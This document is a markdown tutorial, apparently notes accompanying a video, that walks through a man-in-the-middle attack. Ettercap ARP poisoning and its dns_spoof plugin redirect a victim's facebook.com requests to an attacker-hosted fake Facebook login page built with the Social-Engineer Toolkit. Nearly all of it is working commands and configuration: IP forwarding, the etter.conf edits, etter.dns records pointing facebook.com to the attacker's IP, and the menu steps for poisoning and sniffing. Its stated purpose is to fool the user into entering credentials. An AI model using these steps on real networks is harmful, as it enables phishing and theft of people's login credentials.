
##    Ettercap - ARP + DNS Spoofing ft. Social-Engineer Toolkit (SET)

https://www.youtube.com/watch?v=WuvRoJUe9fI

Network Configuration
```
--------------------         ------------------
|                  |---------|     Attacker   |
|      Router      |         |  192.168.1.10  |
|                  |         ------------------
|                  |         ------------------
|   192.168.1.1    |---------|     Victim     |
|                  |         |  192.168.1.15  |
--------------------         ------------------
```
1. Forward packets

By default, packets sent to a computer that aren't meant for that computer are dropped. However, since we're running a man-in-the-middle, all of our traffic will be someone else's. So run the following command to tell Linux to forward packets that aren't for us.
```
# echo 1 > /proc/sys/net/ipv4/ip_forward
```
2. Configuring Ettercap

- Open the configuration file `etter.conf` with a text editor and edit the file.
```
# gedit /etc/ettercap/etter.conf
```
- Edit the `uid` and `gid` values at the top -> make them 0

- Scroll down until you find the heading that says `Linux` and under that remove both the `#` signs below where it says "if you use iptables"

- Save that configuration file

3. Using Social-Engineer Toolkit (SET) to set up a "Facebook login page"

- Please refer to the video...

4. Edit the host file for `dns_spoof` plugin

In a real life scenario, an attacker would redirect traffic to their own machine for data sniffing. In this case, we set up a fake Facebook login page using SET (at step 3), then we use Ettercap to spoof DNS record so that when the victim visits the link facebook.com, he will be redirected to the attacker machine instead. This will probably fool the user into entering their credentials.

We need to modify the host file (etter.dns) which is responsible for redirecting specific DNS requests.
```
# gedit /etc/ettercap/etter.dns
```
Add two lines below "microsoft sucks" part, don't forget to change the IP address to your Kali's IP address.
```
facebook.com      A   192.168.1.10      # Attacker's IP address
*facebook.com      A   192.168.1.10      # Attacker's IP address
```
5. Using Ettercap to conduct DNS Spoofing

- Firstly for testing purpose, we need to clear the ARP cache on Kali machine
```
# ip -s -s neigh flush all
# ip link set arp off dev eth0; ip link set arp on dev eth0
```

- Then check the ARP cache again on Kali machine
```
# arp -n
```

- Open Ettercap

Generally speaking, you are on the same subnet as the target (typically connected to the same router)
- Go to Sniff > Unified sniffing... > choose the right network interface (the interface connected to the Internet)
- Go to Start > Stop sniffing (because Ettercap automatically starts sniffing after we press OK and we don't want that)

Now we need to scan for targets on our network
- Go to Hosts > Scan for hosts (wait until scanning is completed)
- Go to Hosts > Hosts list (to see all the targets that Ettercap has found)

Next we add our victim machine to Target 1 and our network gateway (router) to Target 2
- Select the victim IP address from the host list and choose 'Add to Target 1'
- select the gateway IP address from the host list and choose 'Add to Target 2'

Now we have both Targets set to our victim and gateway, we can proceed to the attack
- Go to MITM > ARP poisoning > choose "Sniff remote connections"
- Then go to Plugins > Manage the plugins > Double click "dns_spoof" to activate that plugin

Finally, let's sniff :)

- Go to Start > Start sniffing

6. Check your test results

Now every time the victim visits the webpage you indicated in the "etter.dns" file (facebook.com in this case), he will be redirected to the malicious webpage.

- For testing purpose, we need to purge the DNS resolver cache + Web browsing history on Victim machine
```
cmd> ipconfig /flushdns
IE / Firefox / Chrome > Clear Browsing Data
```

> Now it's time to check my Facebook profile

- On Victim machine, go to facebook.com

=> We can check the spoofed DNS records on the victim machine (Windows machine)
```
cmd> ipconfig /displaydns
```
=> We can also see the DNS records in Ettercap => [facebook.com] spoofed to [192.168.1.10]

* And don't forget to check traffic sniffed from SET...

